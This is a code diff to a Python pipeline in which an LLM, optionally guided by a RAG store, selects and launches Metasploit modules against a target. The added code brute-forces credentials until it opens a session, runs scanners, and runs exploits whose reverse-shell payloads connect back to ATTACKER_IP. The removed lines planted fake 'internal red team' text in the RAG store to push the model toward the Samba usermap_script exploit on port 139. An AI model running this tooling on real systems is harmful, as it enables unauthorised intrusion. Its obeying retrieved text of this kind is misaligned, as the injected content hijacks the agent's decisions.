@@ -144,8 +144,35 @@ class PentestPipeline:
                 return "No Banner"
         except: return "No Banner"
 
+    # --- SMART RESOLVER ---
     def resolve_module_name(self, bad_name):
-        return bad_name 
+        print(f"{C_YELLOW}[AUTONOMY] Buscando correcao para '{bad_name}'...{C_RESET}")
+        search_terms = []
+        base_name = bad_name.replace("auxiliary", "").replace("scanner", "").replace("exploit", "").strip("/")
+        
+        if "/" in base_name: search_terms.append(base_name.split("/")[-1])
+        else: search_terms.append(base_name)
+
+        for proto in ['ftp', 'ssh', 'http', 'smb', 'mysql', 'postgres', 'telnet', 'smtp', 'irc', 'java', 'vnc']:
+            if proto in base_name: search_terms.append(proto)
+
+        for term in search_terms:
+            try:
+                res = self.msf.client.call('module.search', [term])
+                if not res: continue
+                candidates = []
+                for mod in res:
+                    m_name = mod.get('fullname')
+                    if term not in m_name: continue
+                    if "auxiliary/scanner" in m_name: candidates.append(m_name)
+                    elif "exploit" in m_name and "exploit" in bad_name: candidates.append(m_name)
+
+                if candidates:
+                    candidates.sort(key=len)
+                    print(f"{C_GREEN}[FIX] Substituindo por: {candidates[0]}{C_RESET}")
+                    return candidates[0]
+            except: pass
+        return bad_name
 
     def generate_text_report(self):
         now = datetime.datetime.now()
@@ -217,22 +244,21 @@ class PentestPipeline:
         modo_fase2 = "100% RAG DRIVEN" if self.use_rag else "LLM ONLY - SEM RAG"
         print(f"\n>>> [FASE 2] ANALISE DINAMICA ({modo_fase2})")
         
-        # --- O SEGREDO DO SUCESSO: INJEÇÃO DE THREAT INTEL EM TEMPO REAL ---
+        # --- O RAIO-X DA MEMÓRIA PARA CONFIRMAÇÃO ---
         if self.use_rag:
-            print(f"{C_YELLOW}[*] Baixando Threat Intelligence na Memoria RAM (RAG)...{C_RESET}")
-            intel_text = """
-            INTERNAL RED TEAM DOCUMENTATION SESAP-RN port 139:
-            Attention: During tests, we identified that port 139, which sometimes shows "No Banner", is the legacy file server for the 'Smart-Regula v0.8' system.
-            The MANDATORY strategy to exploit this service is 'exploit_cve'.
-            The exact Metasploit module to use is 'exploit/multi/samba/usermap_script'.
-            In the options, you MUST set the payload by defining "PAYLOAD": "cmd/unix/reverse".
-            Never ignore "No Banner" if it is on port 139.
-            """
-            self.rag.ingest_data([intel_text], [{"source": "live_threat_intel"}])
-            time.sleep(1) # Aguarda a memoria sincronizar
+            try:
+                total_vetores = self.rag.vectordb._collection.count()
+                print(f"{C_YELLOW}[*] RAG Status: {total_vetores} vetores carregados do disco.{C_RESET}")
+                if total_vetores == 0:
+                    print(f"{C_RED}[ALERTA] O banco esta vazio! A ingestao nao foi salva no disco.{C_RESET}")
+            except Exception as e:
+                print(f"{C_RED}[ERRO RAG] Falha ao acessar o banco: {e}{C_RESET}")
+        
+        wordlist_creds = self.load_credentials()
 
         for port, banner in self.open_ports.items():
             
+            # --- FILTRO CIRURGICO: Focar apenas na 139 ---
             if str(port) != "139":
                 continue
             
@@ -241,8 +267,8 @@ class PentestPipeline:
             if self.use_rag:
                 rag_context = "Nenhuma informacao especifica encontrada no RAG."
                 try:
-                    # Query direta e certeira
-                    query = f"INTERNAL RED TEAM DOCUMENTATION SESAP-RN port {port}"
+                    # Query direta e certeira para vencer a Diluição Vetorial
+                    query = f"INTERNAL RED TEAM DOCUMENTATION SESAP-RN port {port} Smart-Regula"
                     docs = self.rag.query(query)
                     
                     if docs: 
@@ -275,12 +301,13 @@ class PentestPipeline:
             3. DEFINE OPTIONS: You MUST provide the necessary Metasploit options dynamically.
                - Include "LHOST": "{ATTACKER_IP}" and "LPORT": "4444".
                - "DisablePayloadHandler": "false".
+            4. Choose Strategy carefully: "exploit_cve", "brute_force" or "enumeration".
                
             OUTPUT FORMAT (JSON ONLY):
             {{
-              "module_type": "exploit",
+              "module_type": "exploit" | "auxiliary",
               "module_name": "category/service/module_name",
-              "strategy": "exploit_cve",
+              "strategy": "exploit_cve" | "brute_force" | "enumeration" | "skip",
               "options": {{"OPT_NAME": "OPT_VALUE"}}
             }}
             """
@@ -300,16 +327,76 @@ class PentestPipeline:
             if resp: print(f"{C_BLUE}[AI] Decisao: {strategy.upper()} | Modulo: '{module}'{C_RESET}")
 
             if strategy == "skip": continue
+            if "login" in module or "credential" in module: strategy = "brute_force"
 
-            m_type, m_name = "exploit", module.replace("exploit/", "")
+            # 1. Limpa o nome do modulo removendo os prefixos que a IA pode ter colocado
+            clean_name = module.replace("exploit/", "").replace("auxiliary/", "").strip("/")
+
+            # 2. Verifica se o modulo existe
+            if not self.msf.verify_module_exists("auxiliary", clean_name) and \
+               not self.msf.verify_module_exists("exploit", clean_name):
+                fixed = self.resolve_module_name(clean_name)
+                if fixed: 
+                    clean_name = fixed.replace("exploit/", "").replace("auxiliary/", "").strip("/")
+                else:
+                    print(f"{C_RED}[ERRO] Modulo '{clean_name}' invalido.{C_RESET}")
+                    continue
+
+            # 3. Define o tipo corretamente cravado na estrategia
+            if strategy == "exploit_cve":
+                m_type = "exploit"
+            else:
+                m_type = "auxiliary"
+                
+            m_name = clean_name
             
             opts = {"RHOSTS": TARGET_IP, "RPORT": int(port)}
             opts.update(llm_options)
             
             print(f"\n{C_MAGENTA}>>> [FASE 3] EXPLORACAO ({strategy.upper()}){C_RESET}")
             
-            if strategy == "exploit_cve":
+            if strategy == "brute_force":
+                if not wordlist_creds:
+                    print(f"{C_YELLOW}[SKIP] Sem wordlist.{C_RESET}")
+                    continue
+                print(f"{C_YELLOW}[*] Brute Force em {module}...{C_RESET}")
+                
+                opts["STOP_ON_SUCCESS"] = "true"
+                opts["BLANK_PASSWORDS"] = "false"
+                opts["USER_AS_PASS"] = "false"
+                opts["VERBOSE"] = "false"
+                
+                found = False
+                for user, pwd in wordlist_creds:
+                    opts["USERNAME"] = user
+                    opts["PASSWORD"] = pwd
+                    print(f"    Testing: {user}:{pwd}", end='\r') 
+                    try:
+                        self.msf.run_module(m_type, m_name, opts)
+                        time.sleep(2) 
+                        s = self.msf.client.call('session.list')
+                        if s:
+                            sid = str(max([int(k) for k in s.keys()]))
+                            if sid != self.session_id:
+                                print(f"\n{C_GREEN}[***] PWNED! Sessao {sid} ({user}:{pwd})!{C_RESET}")
+                                self.session_id = sid
+                                self.history.append(f"[SUCESSO] Porta {port} via {m_name}")
+                                found = True
+                                break
+                    except: pass
+                if not found: print(f"\n{C_RED}[FALHA] Credenciais invalidas.{C_RESET}")
+
+            elif strategy == "enumeration":
+                print(f"{C_YELLOW}[*] Executando Scanner (Run Once)...{C_RESET}")
+                try:
+                    self.msf.run_module(m_type, m_name, opts)
+                    time.sleep(4)
+                    print(f"{C_GREEN}[INFO] Scanner finalizado.{C_RESET}")
+                except Exception as e: print(f"{C_RED}[ERRO] {e}{C_RESET}")
+
+            elif strategy == "exploit_cve":
                 print(f"{C_YELLOW}[*] Tentando Exploit...{C_RESET}")
+                opts["DisablePayloadHandler"] = opts.get("DisablePayloadHandler", "false")
                 
                 print(f"{C_YELLOW}[DEBUG] Executando {m_type}/{m_name}{C_RESET}")
                 print(f"{C_YELLOW}[DEBUG] Opcoes decididas pela IA: {opts}{C_RESET}")
